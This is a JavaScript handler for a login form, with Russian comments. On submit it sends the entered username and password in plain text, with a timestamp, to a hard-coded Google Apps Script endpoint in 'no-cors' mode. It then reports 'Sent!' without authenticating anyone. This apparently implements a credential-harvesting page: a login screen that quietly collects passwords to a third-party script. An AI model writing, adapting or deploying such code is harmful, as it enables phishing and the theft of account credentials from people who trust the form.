const form = document.getElementById('loginForm');
const loginBtn = document.getElementById('loginBtn');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');

// Добавь этот элемент в index.html, куда хочешь показывать сообщение
// Например, сразу после <form id="loginForm"> добавь:
// <p id="msg" style="color: green; margin-top: 10px; text-align: center;"></p>

const msgElement = document.getElementById('msg');

const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzDR_IAsMsXLmxFS8ggh5TlwCED-FmW6K82a29a7chEHkHGCKJvJCrLmNqD3g0O78td/exec";

form.addEventListener('submit', async function(e) {
    e.preventDefault();

    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    if (username === '' || password === '') {
        showMessage("Пожалуйста, заполните все поля", "red");
        return;
    }

    // Блокируем кнопку
    loginBtn.textContent = 'Отправка...';
    loginBtn.disabled = true;

    try {
        // Вариант 1: с no-cors (самый стабильный для Google Script)
        await fetch(GOOGLE_SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",                    // важно!
            headers: {
                "Content-Type": "text/plain;charset=utf-8"   // лучше, чем json
            },
            body: JSON.stringify({
                username: username,
                password: password,
                timestamp: new Date().toISOString()   // дополнительно можно добавить
            })
        });

        showMessage("Отправлено!", "green");

        // Можно очистить форму после успешной отправки
        // form.reset();

    } catch (error) {
        console.error("Ошибка отправки:", error);
        showMessage("Ошибка при отправке. Попробуйте позже.", "red");
    } finally {
        // Возвращаем кнопку в нормальное состояние
        setTimeout(() => {
            loginBtn.textContent = 'Войти';
            loginBtn.disabled = false;
        }, 1500);
    }
});

function showMessage(text, color) {
    if (msgElement) {
        msgElement.innerText = text;
        msgElement.style.color = color;
    } else {
        alert(text); // если элемента msg нет — показываем alert
    }
}

// Активация кнопки при вводе
function checkInputs() {
    const filled = usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '';
    loginBtn.disabled = !filled;
}

usernameInput.addEventListener('input', checkInputs);
passwordInput.addEventListener('input', checkInputs);